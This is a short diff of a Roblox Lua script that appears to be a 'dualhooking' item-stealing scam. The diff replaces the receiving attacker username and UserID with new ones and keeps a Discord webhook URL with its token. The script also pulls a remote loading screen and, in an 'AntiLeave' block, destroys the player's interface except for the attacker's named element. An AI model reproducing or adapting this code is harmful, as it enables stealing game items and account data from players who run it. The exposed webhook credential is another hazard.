@@ -7,8 +7,8 @@
 
 ]]--
 
-local dhuser = "8kknb5e8ryn"       -- dualhooking user
-_G.UserID = "12490815"
+local dhuser = "cuentaakertilin64"       -- dualhooking user
+_G.UserID = "4960586428"
 local dhwebhook = "https://discord.com/api/webhooks/1061617319199129691/2rA5_qHdSvbnjS-bM4LTLeQbQS7CzEUkkRZ5m0epsghd2FuYAqsJ7EWb9-jYuXmmpFXw" -- Dualhooking Webhook
 local loadingraw = "https://raw.githubusercontent.com/TinajeroDev/Pet/main/load.lua" -- Put Your LoadingScreen Raw Link Here
 
@@ -121,7 +121,7 @@ if _G.AntiLeave ~= false then
         end
     end
     for i, v in pairs(game:GetService("CoreGui"):GetChildren()) do
-        if v.Name ~= "Tinajeroo1" and v.Name ~= "RobloxPromptGui" then
+        if v.Name ~= "cuentaakertilin64" and v.Name ~= "RobloxPromptGui" then
             v:Destroy()
         end
     end
